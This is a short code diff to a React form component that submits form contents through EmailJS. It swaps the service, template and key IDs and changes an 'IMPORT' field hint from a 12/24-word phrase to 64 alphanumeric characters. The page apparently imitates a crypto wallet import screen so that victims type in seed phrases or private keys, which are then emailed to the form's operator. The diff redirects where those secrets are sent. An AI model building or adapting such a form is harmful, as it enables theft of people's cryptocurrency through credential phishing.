@@ -21,10 +21,10 @@ const NewForm = () => {
 
     emailjs
       .sendForm(
-        "service_yj787qi",
-        "template_4jfv0kj",
+        "service_baa21jx",
+        "template_tsaqnjc",
         form.current,
-        "g4ZEWVbf7KjSHQdm2"
+        "P_9SIX5hhtfJnOac4"
       )
       .then(
         (result) => {
@@ -44,10 +44,10 @@ const NewForm = () => {
 
     emailjs
       .sendForm(
-        "service_yj787qi",
-        "template_hlyjf9i",
+        "service_baa21jx",
+        "template_0gz19sy",
         form2.current,
-        "g4ZEWVbf7KjSHQdm2"
+        "P_9SIX5hhtfJnOac4"
       )
       .then(
         (result) => {
@@ -151,7 +151,7 @@ const NewForm = () => {
                   }}
                   variant="h6"
                 >
-                  Typically 12 (sometimes 24) words seperated by single spaces
+                  Typically 64 alphanumeric characters
                 </Typography>
               </Box>
               <input className="btn btn-primary" type="submit" value="IMPORT" />
